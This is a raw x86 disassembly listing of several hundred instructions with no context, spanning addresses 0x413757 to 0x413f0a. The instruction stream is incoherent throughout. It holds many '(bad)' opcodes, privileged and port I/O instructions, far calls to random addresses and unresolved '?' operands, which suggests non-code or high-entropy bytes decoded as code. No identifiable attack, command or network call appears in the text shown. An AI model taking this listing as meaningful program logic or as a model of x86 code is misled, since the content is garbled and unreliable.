  413757:	test   al,0xa0
  413759:	pop    esi
  41375a:	xor    bl,ah
  41375c:	mov    bh,0x8e
  41375e:	push   edx
  41375f:	pop    ebx
  413760:	fs pop edi
  413762:	pop    ecx
  413763:	or     eax,0x211cc84e
  413768:	gs mov ch,0x90
  41376b:	mov    ds:0x8bf752c9,al
  413770:	mov    ebx,DWORD PTR [eax+0x3]
  413773:	xor    DWORD PTR [esi+0x3e1502a7],esi
  413779:	push   es
  41377a:	sbb    eax,eax
  41377c:	mov    ch,0x64
  41377e:	or     eax,0x5fb2765a
  413783:	and    eax,0xfa87c816
  413788:	xor    dh,BYTE PTR [edi-0x7fc8eb35]
  41378e:	scas   al,BYTE PTR es:[edi]
  41378f:	fwait
  413790:	int3   
  413791:	push   edx
  413792:	sahf   
  413793:	xor    bl,BYTE PTR [edx]
  413795:	(bad)  
  413796:	pop    esi
  413797:	cmp    edi,DWORD PTR [ecx+0x35]
  41379a:	enter  0x6019,0xd1
  41379e:	in     eax,0xec
  4137a0:	xchg   edi,eax
  4137a1:	mov    ds:0x843c4d1e,al
  4137a6:	fwait
  4137a7:	stc    
  4137a8:	mov    al,ds:0x3c81a212
  4137ad:	sub    dh,BYTE PTR [esi]
  4137af:	mov    dh,0x33
  4137b1:	sub    BYTE PTR ds:0xa0e57821,bh
  4137b7:	data16 jae 0x413820
  4137ba:	scas   eax,DWORD PTR es:[edi]
  4137bb:	fcmovu st,st(1)
  4137bd:	sahf   
  4137be:	call   0x2e768bfb
  4137c3:	xchg   edx,eax
  4137c4:	imul   dh
  4137c6:	xchg   BYTE PTR [ebx-0x50ef864f],bl
  4137cc:	push   edx
  4137cd:	sub    eax,ebx
  4137cf:	(bad)
  4137d2:	add    DWORD PTR [edx-0x3035c997],esi
  4137d8:	int    0xba
  4137da:	(bad)  
  4137db:	cmp    DWORD PTR [edx-0x68],ecx
  4137de:	inc    edx
  4137df:	lea    edx,[edi-0x7a]
  4137e2:	mov    ebx,0x4dc44a94
  4137e7:	test   BYTE PTR [edx-0x1c324544],cl
  4137ed:	jo     0x413850
  4137ef:	add    BYTE PTR [ecx],dl
  4137f1:	dec    ebx
  4137f2:	aam    0xcf
  4137f4:	ss add ebp,0x72
  4137f8:	icebp  
  4137f9:	neg    DWORD PTR [eax+edx*1]
  4137fc:	mov    al,0xe5
  4137fe:	dec    BYTE PTR ds:0xb40f1c52
  413804:	(bad)  
  413805:	sbb    BYTE PTR [eax+0x6b400087],dl
  41380b:	idiv   BYTE PTR [ebx-0x4b]
  41380e:	hlt    
  41380f:	xchg   BYTE PTR [eax+0xc1f73a3],cl
  413815:	sbb    al,0xa9
  413817:	adc    al,0xef
  413819:	test   ecx,eax
  41381b:	rcl    bl,1
  41381d:	(bad)  
  41381e:	jns    0x4137d5
  413820:	int3   
  413821:	add    eax,0xf28e00ef
  413826:	add    DWORD PTR [ebx],ebx
  413828:	xchg   esp,eax
  413829:	(bad)  
  41382b:	cmp    dh,BYTE PTR [eax-0xa]
  41382e:	pop    eax
  41382f:	mov    gs,WORD PTR [ebx]
  413831:	dec    ecx
  413832:	pop    ecx
  413833:	jmp    0x41385e
  413835:	dec    ecx
  413836:	loope  0x4137e4
  413838:	aam    0x63
  41383a:	pop    es
  41383b:	mov    ds:0xef518a16,eax
  413840:	jecxz  0x4137d5
  413842:	(bad)  
  413843:	push   ebp
  413844:	(bad)  
  413845:	jle    0x4137e9
  413847:	shr    DWORD PTR [ecx+0x622e5487],0xa6
  41384e:	and    eax,0xa79f4955
  413853:	mov    edx,0x36acc824
  413858:	dec    ecx
  413859:	clc    
  41385a:	or     eax,0x2751b5c2
  41385f:	sub    cl,BYTE PTR [ebx]
  413861:	repnz aas 
  413863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413864:	mov    cl,0x68
  413866:	cmp    BYTE PTR [esi+0x6c],bl
  413869:	inc    ecx
  41386a:	aad    0xde
  41386c:	inc    ebx
  41386d:	sub    esp,DWORD PTR [ebx+0x43]
  413870:	dec    esp
  413871:	push   eax
  413872:	imul   ebx,DWORD PTR [esi],0xffffff95
  413875:	scas   eax,DWORD PTR es:[edi]
  413876:	cwde   
  413877:	fidivr DWORD PTR [esi-0x6b572137]
  41387d:	xchg   ebx,eax
  41387e:	mov    edx,0x3aef35c
  413883:	push   es
  413884:	cld    
  413885:	and    esp,0xffffffb1
  413888:	pusha  
  413889:	add    BYTE PTR [edx],al
  41388b:	jp     0x413874
  41388d:	dec    eax
  41388e:	fisub  DWORD PTR [ebp-0x54]
  413891:	mov    al,ds:0x67aa8c6
  413896:	repnz fstp TBYTE PTR cs:0x772042ea
  41389e:	(bad)  
  41389f:	push   ss
  4138a0:	daa    
  4138a1:	scas   eax,DWORD PTR es:[edi]
  4138a2:	cld    
  4138a3:	adc    al,0x6b
  4138a5:	jo     0x4138a9
  4138a7:	dec    ecx
  4138a8:	mov    al,dl
  4138aa:	ins    BYTE PTR es:[edi],dx
  4138ab:	out    dx,eax
  4138ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ad:	mov    esi,0x6862aef9
  4138b2:	icebp  
  4138b3:	cld    
  4138b4:	ret    
  4138b5:	test   al,0x8b
  4138b7:	test   DWORD PTR [edx-0x7b354a79],edx
  4138bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138be:	sub    al,0x9f
  4138c0:	(bad)  
  4138c2:	repz es pop esi
  4138c5:	mov    es,WORD PTR [edx+0x30e0a4f1]
  4138cb:	int3   
  4138cc:	cmp    eax,DWORD PTR [ebx]
  4138ce:	pcmpeqd mm6,mm5
  4138d1:	and    eax,0x3d70103f
  4138d6:	xchg   edx,eax
  4138d7:	mov    dh,0xe1
  4138d9:	pop    ebx
  4138da:	add    al,0x96
  4138dc:	sub    ch,BYTE PTR [ebx+0x2575c9c3]
  4138e2:	pop    esp
  4138e3:	(bad)  
  4138e4:	sti    
  4138e5:	inc    esi
  4138e6:	mov    edi,0x930730
  4138eb:	test   eax,0xec676e9d
  4138f0:	sbb    al,0x7
  4138f2:	popa   
  4138f3:	hlt    
  4138f4:	and    BYTE PTR [edx+0x519f106f],dl
  4138fa:	es xor al,0xba
  4138fd:	into   
  4138fe:	adc    eax,0x9ec93e14
  413903:	bound  ebp,QWORD PTR [esi-0x43]
  413906:	sub    ah,BYTE PTR [ebp+edx*1-0x47]
  41390a:	in     al,dx
  41390b:	push   esi
  41390c:	or     dl,al
  41390e:	sbb    BYTE PTR [ecx+ebp*2],dl
  413911:	es inc esp
  413913:	lds    ebx,FWORD PTR [ebp-0x182aec5]
  413919:	cmp    DWORD PTR [ebx-0x1f3aca76],0xc
  413920:	pop    ecx
  413921:	jne    0x413907
  413923:	call   0x9f5cde50
  413928:	stc    
  413929:	lea    ebp,[edi]
  41392b:	mov    esp,0x4b452890
  413930:	gs sahf 
  413932:	xor    BYTE PTR [ebx+0x59],ch
  413935:	xchg   edi,eax
  413936:	jno    0x4138c9
  413938:	imul   DWORD PTR [esi+0x57e695e6]
  41393e:	dec    edi
  41393f:	(bad)  
  413940:	loope  0x41394c
  413942:	fwait
  413943:	xchg   edx,eax
  413944:	(bad)  
  413945:	stc    
  413946:	pop    ebp
  413947:	cmp    eax,0x9edd67d
  41394c:	retf   0x58db
  41394f:	xchg   esi,eax
  413950:	adc    eax,0x547918c1
  413955:	imul   edi,edi,0x7c
  413958:	mov    ah,0x50
  41395a:	mov    ebx,0x4faeea6b
  41395f:	jecxz  0x41390d
  413961:	xchg   esi,eax
  413962:	jmp    0x41391c
  413964:	push   cs
  413965:	mov    al,0xa2
  413967:	sub    ah,BYTE PTR [edi]
  413969:	inc    ebx
  41396a:	xchg   ecx,eax
  41396b:	inc    eax
  41396c:	sahf   
  41396d:	js     0x4139a5
  41396f:	es ins BYTE PTR es:[edi],dx
  413971:	lahf   
  413972:	mov    dl,0x6b
  413974:	inc    esi
  413975:	mov    dh,0xbb
  413977:	mov    bh,0x1
  413979:	ffree  st(2)
  41397b:	loope  0x413907
  41397d:	dec    ebx
  41397e:	ficomp WORD PTR [ebp-0x77]
  413981:	enter  0x58dc,0xe
  413985:	adc    eax,0x2ba66edd
  41398a:	lods   eax,DWORD PTR ds:[esi]
  41398b:	dec    ecx
  41398c:	scas   eax,DWORD PTR es:[edi]
  41398d:	jae    0x413980
  41398f:	ds mov bl,bl
  413992:	mov    ds:0x61ff9f7b,eax
  413997:	add    dh,BYTE PTR [eax]
  413999:	or     edi,ebx
  41399b:	and    al,0xb5
  41399d:	sbb    esi,0x41
  4139a0:	xchg   ebx,eax
  4139a1:	inc    ebp
  4139a2:	mov    dh,0xfa
  4139a4:	cmp    edi,DWORD PTR [esi+0x2e]
  4139a7:	cld    
  4139a8:	xchg   edi,eax
  4139a9:	mov    al,0xa3
  4139ab:	push   edx
  4139ac:	xor    al,0xd6
  4139ae:	xchg   edx,eax
  4139af:	jno    0x413936
  4139b1:	xor    eax,0x47467169
  4139b6:	lods   eax,DWORD PTR ds:[esi]
  4139b7:	js     0x4139d1
  4139b9:	inc    ebx
  4139bb:	data16 aam 0xf6
  4139be:	jl     0x4139d1
  4139c0:	ret    0xa0fc
  4139c3:	cmp    al,BYTE PTR [edx-0x3d]
  4139c6:	sbb    BYTE PTR [esi-0x6f7e1347],ah
  4139cc:	pusha  
  4139cd:	and    BYTE PTR [ebp+0x4f90561e],al
  4139d3:	loopne 0x413a4b
  4139d5:	sahf   
  4139d6:	popa   
  4139d7:	mov    edx,0x2e34fe91
  4139dc:	dec    edx
  4139dd:	ret    0xb447
  4139e0:	jle    0x413a08
  4139e2:	jp     0x4139e3
  4139e4:	aas    
  4139e5:	lahf   
  4139e6:	mov    cl,0xdf
  4139e8:	cli    
  4139e9:	cdq    
  4139ea:	rcl    ch,cl
  4139ec:	bound  edi,QWORD PTR ds:0x37e0ad07
  4139f2:	imul   ebp,DWORD PTR ds:0x19f85847,0xd2e0827e
  4139fc:	jne    0x413a0d
  4139fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ff:	imul   edi,DWORD PTR [edx-0x77],0xffffffa7
  413a03:	adc    DWORD PTR [ebp+eiz*8+0x6c63c7c6],ebp
  413a0a:	pop    edx
  413a0b:	pop    esp
  413a0c:	push   ebp
  413a0d:	leave  
  413a0e:	push   ebp
  413a0f:	sub    bl,BYTE PTR [edi+0x6bc5cd9a]
  413a15:	cmp    ch,ch
  413a17:	ret    
  413a18:	nop
  413a19:	das    
  413a1a:	mov    eax,ds:0x35e071f4
  413a1f:	jo     0x413a1b
  413a21:	(bad)  
  413a23:	push   cs
  413a24:	and    eax,0xc98240f0
  413a29:	add    edi,esi
  413a2b:	popf   
  413a2c:	push   esp
  413a2d:	pop    ds
  413a2e:	adc    eax,0xce647acf
  413a33:	fild   QWORD PTR [eax+0x8076ca2]
  413a39:	daa    
  413a3a:	mov    dh,0xde
  413a3c:	push   esp
  413a3d:	pop    ds
  413a3e:	sahf   
  413a3f:	pop    ecx
  413a40:	add    bh,al
  413a42:	icebp  
  413a43:	test   eax,0xb4194256
  413a48:	push   0xaf5f8ced
  413a4d:	dec    ebp
  413a4e:	cdq    
  413a4f:	test   BYTE PTR [edi+0x5a],bl
  413a52:	arpl   sp,si
  413a54:	fwait
  413a55:	mov    bh,cl
  413a57:	and    DWORD PTR [eax+eax*8],ecx
  413a5a:	mov    ecx,0x7b3d290d
  413a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a60:	(bad)  
  413a61:	(bad)  
  413a62:	jo     0x4139e9
  413a64:	dec    edx
  413a65:	std    
  413a66:	inc    edi
  413a67:	sub    DWORD PTR ds:0x81cd1a5a,ebx
  413a6d:	adc    eax,0x78127c06
  413a72:	ja     0x413a39
  413a74:	xchg   esi,eax
  413a75:	fmul   DWORD PTR [esi+ecx*8-0x50]
  413a79:	fsubr  st,st(4)
  413a7b:	pop    ebp
  413a7c:	or     cl,BYTE PTR [ecx+0x5871d7b2]
  413a82:	xor    ebp,DWORD PTR [eax-0xa90edc9]
  413a88:	cmp    al,0xc5
  413a8a:	adc    ebx,DWORD PTR [edi-0x2a619f3a]
  413a90:	xor    DWORD PTR [ecx],esp
  413a92:	pusha  
  413a93:	mov    ch,0xec
  413a95:	cld    
  413a96:	mov    al,BYTE PTR [edx-0x58dea4f0]
  413a9c:	fimul  WORD PTR [esi+0xc]
  413a9f:	retf   0x2a91
  413aa2:	xor    bh,dh
  413aa4:	rol    BYTE PTR [ebx],1
  413aa6:	fild   WORD PTR ds:0x3dba1b3d
  413aac:	inc    ebx
  413aad:	imul   esp,esi,0x8489631b
  413ab3:	enter  0x6a78,0x70
  413ab7:	inc    esi
  413ab8:	mov    eax,ds:0xe2e1f035
  413abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413abe:	xchg   edi,eax
  413abf:	mov    ch,0x65
  413ac1:	retf   0xfc3b
  413ac4:	adc    ebp,0xffffffea
  413ac7:	xchg   eax,eax
  413ac9:	mov    dl,0xa5
  413acb:	fst    QWORD PTR [edi+0x3657c7e8]
  413ad1:	ret    
  413ad2:	fs jp  0x413aca
  413ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ad6:	(bad)  
  413ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ad9:	loope  0x413ab8
  413adb:	scas   eax,DWORD PTR es:[edi]
  413adc:	mov    ch,0x75
  413ade:	into   
  413adf:	(bad)  
  413ae0:	and    edx,DWORD PTR [edi]
  413ae2:	lods   eax,DWORD PTR ds:[esi]
  413ae3:	adc    bh,BYTE PTR [edx-0x5a]
  413ae6:	jno    0x413a95
  413ae8:	jmp    0x8ae596b5
  413aed:	scas   eax,DWORD PTR es:[edi]
  413aee:	and    esi,esp
  413af0:	stc    
  413af1:	int3   
  413af2:	or     eax,0x66833f87
  413af7:	xor    al,0xf2
  413af9:	inc    ecx
  413afa:	ja     0x413a8e
  413afc:	or     BYTE PTR [eax+eax*4+0x18],0x26
  413b01:	aam    0x5e
  413b03:	mov    eax,ds:0x5c981171
  413b08:	(bad)  
  413b0b:	sub    BYTE PTR [esi],bh
  413b0d:	jmp    0x413b17
  413b0f:	or     eax,0x83a6e5eb
  413b14:	and    eax,0xa25dcc38
  413b19:	mov    ds:0x1e3d6a20,eax
  413b1e:	jne    0x413af7
  413b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b21:	outs   dx,BYTE PTR ds:[esi]
  413b22:	and    edx,ecx
  413b24:	xchg   ebp,eax
  413b25:	mov    ebp,0x391b533c
  413b2a:	jmp    0x3da9068c
  413b2f:	sub    DWORD PTR [ecx+0x140ac564],eax
  413b35:	jb     0x413b3f
  413b37:	mov    ah,0xa0
  413b39:	jle    0x413b28
  413b3b:	xor    eax,0x3c6edfe4
  413b40:	ror    BYTE PTR [ebp+0x3b],0xde
  413b44:	adc    eax,0xa0bd9d90
  413b49:	jb     0x413ad5
  413b4b:	adc    BYTE PTR [ebp+0x7],cl
  413b4e:	repz out 0x8e,eax
  413b51:	hlt    
  413b52:	popf   
  413b53:	fs mov eax,0xbb1da7b9
  413b59:	cmp    al,0x24
  413b5b:	pop    ecx
  413b5c:	dec    ebp
  413b5d:	mov    esi,0x7891ce5d
  413b62:	int3   
  413b63:	adc    dl,bl
  413b65:	sub    eax,0x5999bd11
  413b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b6b:	pop    edi
  413b6c:	not    bl
  413b6e:	fwait
  413b6f:	mov    ah,0xf5
  413b71:	jbe    0x413b8f
  413b73:	cmc    
  413b74:	cdq    
  413b75:	pusha  
  413b76:	mul    DWORD PTR [eax-0x14]
  413b79:	popa   
  413b7a:	and    al,0xb
  413b7c:	(bad)  
  413b7e:	shr    BYTE PTR [ebx+0x3d8c1f9d],1
  413b84:	shl    BYTE PTR [eax],0x12
  413b87:	lods   al,BYTE PTR ds:[esi]
  413b88:	jecxz  0x413b63
  413b8a:	dec    esi
  413b8b:	jg     0x413b9c
  413b8d:	shl    edi,cl
  413b8f:	pop    es
  413b90:	jge    0x413b67
  413b92:	test   eax,0x5e16177b
  413b97:	mov    eax,ds:0xdc5cd3e0
  413b9c:	iret   
  413b9d:	mov    cl,0x3e
  413b9f:	mov    ch,0x1d
  413ba1:	je     0x413b42
  413ba3:	call   DWORD PTR [ecx]
  413ba5:	arpl   ax,bp
  413ba7:	sbb    BYTE PTR [ebx+ecx*4+0x69],bl
  413bab:	call   0x1699:0x35260e0b
  413bb2:	push   edi
  413bb3:	jno    0x413bf9
  413bb5:	aad    0xd2
  413bb7:	sub    bh,BYTE PTR [ebx-0x14]
  413bba:	dec    esi
  413bbb:	(bad)  
  413bbc:	stos   BYTE PTR es:[edi],al
  413bbd:	ficom  DWORD PTR [eax]
  413bbf:	sbb    BYTE PTR [edi+0x1447bada],0xc9
  413bc6:	lds    esp,FWORD PTR [eax]
  413bc8:	or     DWORD PTR [ebx+0x1acfd364],ebx
  413bce:	pop    edx
  413bcf:	dec    eax
  413bd0:	fstp   DWORD PTR [esi+0x4a]
  413bd3:	mov    ds:0xb1cb9b29,eax
  413bd8:	mov    bl,0xde
  413bda:	and    eax,edx
  413bdc:	int    0x2c
  413bde:	dec    eax
  413bdf:	inc    esp
  413be0:	dec    edx
  413be1:	scas   eax,DWORD PTR es:[edi]
  413be2:	in     al,0xa8
  413be4:	int    0x83
  413be6:	xchg   ebp,eax
  413be7:	jne    0x413bb7
  413be9:	das    
  413bea:	xchg   DWORD PTR [ebp-0xa],edx
  413bed:	fnstsw WORD PTR [edx]
  413bef:	sbb    ebx,DWORD PTR [eax]
  413bf1:	push   0x62
  413bf3:	cmp    dh,BYTE PTR [ebp-0x5e]
  413bf6:	jecxz  0x413ba0
  413bf8:	sbb    al,BYTE PTR [edx]
  413bfa:	popa   
  413bfb:	jp     0x413c03
  413bfd:	inc    esp
  413bfe:	sahf   
  413bff:	dec    eax
  413c00:	mov    WORD PTR [edi-0x52],?
  413c03:	in     eax,0x62
  413c05:	sbb    eax,0xc511d1cb
  413c0a:	ins    BYTE PTR es:[edi],dx
  413c0b:	sub    ecx,DWORD PTR [edi+0x6c3907fa]
  413c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c12:	or     al,0xe8
  413c14:	or     eax,0x8f768c4b
  413c19:	cmp    cl,BYTE PTR [edx+0x1d]
  413c1c:	and    esp,DWORD PTR [esi]
  413c1e:	fcom   st(4)
  413c20:	xchg   ebp,eax
  413c21:	push   ecx
  413c22:	and    BYTE PTR [ecx],cl
  413c24:	pop    edi
  413c25:	sbb    ebx,esp
  413c27:	es int 0x82
  413c2a:	add    ebp,ecx
  413c2c:	into   
  413c2d:	mov    cl,0xc8
  413c2f:	and    BYTE PTR [edx],bh
  413c31:	jl     0x413c67
  413c33:	sbb    eax,0xb0e02a15
  413c38:	push   esi
  413c39:	popf   
  413c3a:	inc    esp
  413c3b:	nop
  413c3c:	push   edx
  413c3d:	pop    esi
  413c3e:	clc    
  413c3f:	xor    BYTE PTR [edi-0x62],0x1a
  413c43:	std    
  413c44:	in     al,dx
  413c45:	arpl   WORD PTR [edi],di
  413c47:	das    
  413c48:	dec    ebx
  413c49:	loope  0x413bdf
  413c4b:	push   ebp
  413c4c:	inc    esp
  413c4d:	test   BYTE PTR [eax+0x6a],dh
  413c50:	pop    ebp
  413c51:	retf   
  413c52:	jmp    0xb3d0a6bc
  413c57:	add    DWORD PTR [eax],ebx
  413c59:	test   eax,0x2b2428a5
  413c5e:	sbb    eax,0x3e27bff3
  413c63:	xchg   ebp,eax
  413c64:	das    
  413c65:	xor    BYTE PTR ds:0xec3a60f,0x39
  413c6c:	clc    
  413c6d:	mov    cl,BYTE PTR [edx+0x1b96116]
  413c73:	inc    ebx
  413c74:	inc    ebx
  413c75:	push   ecx
  413c76:	sbb    ch,BYTE PTR [edx-0x720d5525]
  413c7c:	out    0x41,eax
  413c7e:	push   edi
  413c7f:	outs   dx,BYTE PTR ds:[esi]
  413c80:	add    BYTE PTR [ebp+0x5add50b8],dh
  413c86:	jne    0x413caa
  413c88:	data16 xor BYTE PTR [eax+0x40],al
  413c8c:	sbb    edx,DWORD PTR [eax-0x52ef482e]
  413c92:	fistp  WORD PTR [edx-0x8]
  413c95:	daa    
  413c96:	(bad)  [edi+esi*1-0x6d]
  413c9a:	retf   
  413c9b:	shl    BYTE PTR [eax-0x62],0x40
  413c9f:	and    al,0x3d
  413ca1:	sahf   
  413ca2:	or     al,0xb5
  413ca4:	gs jbe 0x413c33
  413ca7:	and    BYTE PTR [ecx-0x5d],ah
  413caa:	push   ds
  413cab:	sbb    eax,DWORD PTR [ecx+0x5ca9e32a]
  413cb1:	xor    al,0xab
  413cb3:	push   es
  413cb4:	adc    esp,DWORD PTR [eax+0x6908e701]
  413cba:	in     al,0x1b
  413cbc:	push   ss
  413cbd:	xchg   esi,eax
  413cbe:	enter  0x5b9c,0x3e
  413cc2:	cli    
  413cc3:	aam    0xe8
  413cc5:	imul   ebp,DWORD PTR [ebp+0x731e0cfb],0xe8f55d91
  413ccf:	and    BYTE PTR [eax-0x4b],dh
  413cd2:	pop    es
  413cd3:	cld    
  413cd4:	mov    ch,0xf0
  413cd6:	push   ebx
  413cd7:	dec    edi
  413cd8:	pop    es
  413cd9:	add    al,0xa9
  413cdb:	add    al,0x2a
  413cdd:	dec    esp
  413cde:	cmp    eax,0xfef9d59e
  413ce3:	in     eax,dx
  413ce4:	sbb    BYTE PTR cs:[edx-0x58198708],0x79
  413cec:	(bad)  
  413ced:	ucomiss xmm6,xmm3
  413cf0:	mov    al,0xbc
  413cf2:	fwait
  413cf3:	or     ebx,DWORD PTR [edi]
  413cf5:	sbb    eax,0x6a84fe50
  413cfa:	sbb    al,0x10
  413cfc:	loope  0x413d6f
  413cfe:	ja     0x413d49
  413d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d01:	pusha  
  413d02:	pop    ds
  413d03:	pop    ebx
  413d04:	je     0x413c99
  413d06:	inc    ebp
  413d07:	sub    DWORD PTR [esi+0x43b1ae91],0x43
  413d0e:	mov    eax,0xb02f7706
  413d13:	jmp    0x413d69
  413d15:	dec    ecx
  413d16:	out    0x5c,eax
  413d18:	fs jl  0x413cbf
  413d1b:	stc    
  413d1c:	or     al,0x7c
  413d1e:	mov    bh,0x17
  413d20:	push   edi
  413d21:	ins    DWORD PTR es:[edi],dx
  413d22:	sbb    ebp,eax
  413d24:	in     al,0xc8
  413d26:	jle    0x413cff
  413d28:	mov    al,0x61
  413d2a:	lea    ecx,[eax]
  413d2c:	sub    cl,BYTE PTR [eax+esi*8+0x29]
  413d30:	mov    eax,ds:0x8c3c5424
  413d35:	mov    dl,0x1
  413d37:	cld    
  413d38:	arpl   si,sp
  413d3a:	fld    QWORD PTR [esp+ebp*2]
  413d3d:	jmp    0x413d25
  413d3f:	not    BYTE PTR [edi]
  413d41:	cmc    
  413d42:	dec    esp
  413d43:	test   BYTE PTR [ebx-0x2f3dc0f1],cl
  413d49:	(bad)  [edi+0x7c4932e3]
  413d4f:	adc    edx,DWORD PTR [edx+ebp*2-0x5856b874]
  413d56:	add    al,0x67
  413d58:	daa    
  413d59:	ret    
  413d5a:	mov    cl,0x35
  413d5c:	loop   0x413dd2
  413d5e:	xor    DWORD PTR [esp+edx*8+0x173315f],0xffffffc0
  413d66:	mov    ds:0xd8b9f40f,eax
  413d6b:	nop
  413d6c:	outs   dx,DWORD PTR ds:[esi]
  413d6d:	pop    ebp
  413d6e:	es pop es
  413d70:	mov    ebp,DWORD PTR [esi+0x32]
  413d73:	xor    BYTE PTR [ebx],bl
  413d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d76:	inc    edi
  413d77:	mov    dl,0x94
  413d79:	mov    bl,BYTE PTR [esi+0x3f]
  413d7c:	idiv   ah
  413d7e:	push   cs
  413d7f:	loopne 0x413db7
  413d81:	xor    ecx,DWORD PTR [esi]
  413d83:	imul   eax,DWORD PTR [edx+eiz*4-0x44],0xffffffed
  413d88:	outs   dx,BYTE PTR ds:[esi]
  413d89:	sbb    eax,0x95462834
  413d8e:	retf   0xf784
  413d91:	adc    al,0x9b
  413d93:	dec    eax
  413d94:	sub    al,ch
  413d96:	mov    BYTE PTR [eax+0x3186b808],cl
  413d9c:	popa   
  413d9d:	ficom  WORD PTR [esi-0x789c41c0]
  413da3:	ins    DWORD PTR es:[edi],dx
  413da4:	out    0x2,eax
  413da6:	ss jbe 0x413d7d
  413da9:	dec    edx
  413daa:	and    al,0xec
  413dac:	cmp    eax,0x23198a24
  413db1:	inc    ebx
  413db2:	test   al,0xab
  413db4:	fcomp  QWORD PTR [eax-0xd211f9]
  413dba:	iret   
  413dbb:	ror    DWORD PTR [edi-0x2d],1
  413dbe:	repnz pop ebp
  413dc0:	mov    al,0x86
  413dc2:	xor    bl,cl
  413dc4:	cmp    BYTE PTR [edi+0x715f546],0xd1
  413dcb:	repz gs inc eax
  413dce:	call   0x7034:0x53418edc
  413dd5:	mov    WORD PTR [ecx-0x59290e1],?
  413ddb:	scas   al,BYTE PTR es:[edi]
  413ddc:	outs   dx,BYTE PTR ds:[esi]
  413ddd:	outs   dx,DWORD PTR ds:[esi]
  413dde:	bound  edx,QWORD PTR [esi+0x4472784]
  413de4:	xor    al,dl
  413de6:	push   ss
  413de7:	push   ss
  413de8:	push   DWORD PTR [ebx]
  413dea:	fst    QWORD PTR [ecx-0x1925ad92]
  413df0:	jns    0x413e65
  413df2:	cdq    
  413df3:	(bad)  
  413df4:	mov    ecx,0x51e74aa5
  413df9:	fsub   st,st(6)
  413dfb:	or     BYTE PTR [ecx+ebx*8-0x6c],bl
  413dff:	retf   0xe8d2
  413e02:	mov    dl,0x70
  413e04:	xchg   ch,dl
  413e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e07:	popa   
  413e08:	hlt    
  413e09:	sbb    cl,BYTE PTR [esi+eax*1+0x1678e172]
  413e10:	inc    edi
  413e11:	sub    eax,0xdafd06c1
  413e16:	in     al,0xfa
  413e18:	mov    al,ds:0x53f145bb
  413e1d:	mov    dl,0x1f
  413e1f:	rol    BYTE PTR [esi],cl
  413e21:	mov    al,0x14
  413e23:	aad    0xe1
  413e25:	scas   eax,DWORD PTR es:[edi]
  413e26:	or     eax,DWORD PTR [ecx-0x1e517b69]
  413e2c:	mov    edx,0xfb645da
  413e31:	pusha  
  413e32:	repz fisttp DWORD PTR [esi-0x71ba867f]
  413e39:	or     dl,0xb0
  413e3c:	push   cs
  413e3d:	pop    esp
  413e3e:	xchg   ecx,eax
  413e3f:	pop    edx
  413e40:	retf   
  413e41:	push   edi
  413e42:	loop   0x413e74
  413e44:	add    eax,0x6ad169b5
  413e49:	dec    esp
  413e4a:	call   0x4ef2:0x3c62f561
  413e51:	push   edi
  413e52:	test   DWORD PTR [ebx+ebx*8],0xb3f4b33d
  413e59:	dec    edi
  413e5a:	push   ecx
  413e5b:	adc    al,bl
  413e5d:	jo     0x413ec2
  413e5f:	jns    0x413e93
  413e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e62:	sbb    eax,0xea292b7b
  413e67:	std    
  413e68:	push   eax
  413e69:	jmp    0x5df3bf95
  413e6e:	xor    BYTE PTR [edi+0x766c0852],dh
  413e74:	arpl   bx,di
  413e76:	sub    al,0x1c
  413e78:	ret    0x67b9
  413e7b:	adc    eax,0xe6bc23d6
  413e80:	jge    0x413e52
  413e82:	(bad)  
  413e83:	cmc    
  413e84:	inc    edx
  413e85:	push   edi
  413e86:	cmp    BYTE PTR [edi-0xfb89249],cl
  413e8c:	stos   DWORD PTR es:[edi],eax
  413e8d:	std    
  413e8e:	pop    esp
  413e8f:	pusha  
  413e90:	mov    DWORD PTR [edi],ebp
  413e92:	pop    ss
  413e93:	lea    ebx,[edi]
  413e95:	jp     0x413e3c
  413e97:	xor    al,0x0
  413e99:	ins    DWORD PTR es:[edi],dx
  413e9a:	fistp  WORD PTR [esp+edx*8]
  413e9d:	push   esp
  413e9f:	dec    edx
  413ea0:	cmp    ebp,edi
  413ea2:	fmul   st,st(6)
  413ea4:	xchg   edx,eax
  413ea5:	cwde   
  413ea6:	daa    
  413ea7:	and    dl,BYTE PTR [eax]
  413ea9:	adc    al,0xd1
  413eab:	fsub   QWORD PTR ds:0xb73af47d
  413eb1:	mov    ecx,0xcad3848b
  413eb6:	lods   al,BYTE PTR ds:[esi]
  413eb7:	(bad)  
  413eb8:	xor    ah,BYTE PTR [edx]
  413eba:	xchg   edi,eax
  413ebb:	adc    esp,DWORD PTR [eax+0x170db03e]
  413ec1:	adc    dl,0xe
  413ec4:	cli    
  413ec5:	adc    DWORD PTR [ebx+0x51],edx
  413ec8:	fsubr  st,st(6)
  413eca:	lds    ebx,FWORD PTR [esi+0x19550fe9]
  413ed0:	iret   
  413ed1:	add    eax,0xe30d248f
  413ed6:	xchg   ebp,eax
  413ed7:	dec    esi
  413ed8:	push   cs
  413ed9:	ficomp DWORD PTR [esi]
  413edb:	add    BYTE PTR [esp+ecx*8+0xe1de56],al
  413ee2:	and    al,0xcc
  413ee4:	push   esi
  413ee5:	adc    DWORD PTR [ebx+0x76c1918c],ebp
  413eeb:	ror    BYTE PTR [edi],0xe9
  413eee:	std    
  413eef:	pop    edi
  413ef0:	mov    edx,0x8afd0890
  413ef5:	sbb    dh,BYTE PTR [edi-0x20]
  413ef8:	sbb    BYTE PTR [eax-0x43f30c28],cl
  413efe:	xchg   ebx,eax
  413eff:	ror    DWORD PTR [edi-0x489891ac],1
  413f05:	fisub  DWORD PTR [eax]
  413f07:	lock mul edx
  413f0a:	mov    bl,0x47
